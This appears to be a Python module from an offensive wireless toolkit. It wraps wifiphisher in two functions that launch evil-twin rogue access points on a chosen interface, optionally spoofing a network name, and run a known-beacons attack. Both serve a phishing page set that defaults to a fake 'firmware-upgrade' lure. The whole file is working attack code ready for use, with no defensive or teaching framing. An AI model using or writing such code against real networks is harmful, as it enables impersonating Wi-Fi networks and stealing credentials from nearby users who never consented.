from typing import List, Optional

from ..utils import ToolError, run_quiet, which


def evil_twin(iface: str, essid: Optional[str] = None,
              phishing_page: str = "firmware-upgrade",
              extra: Optional[List[str]] = None) -> None:
    if which("wifiphisher") is None:
        raise ToolError("wifiphisher not installed (pip install wifiphisher)")
    cmd = ["wifiphisher", "-i", iface]
    if essid:
        cmd += ["-e", essid]
    cmd += ["--phishing-pageset", phishing_page]
    if extra:
        cmd.extend(extra)
    run_quiet(cmd)


def known_beacons(iface: str, phishing_page: str = "firmware-upgrade") -> None:
    if which("wifiphisher") is None:
        raise ToolError("wifiphisher not installed")
    run_quiet([
        "wifiphisher", "-i", iface,
        "-nJ", "--phishing-pageset", phishing_page,
    ])
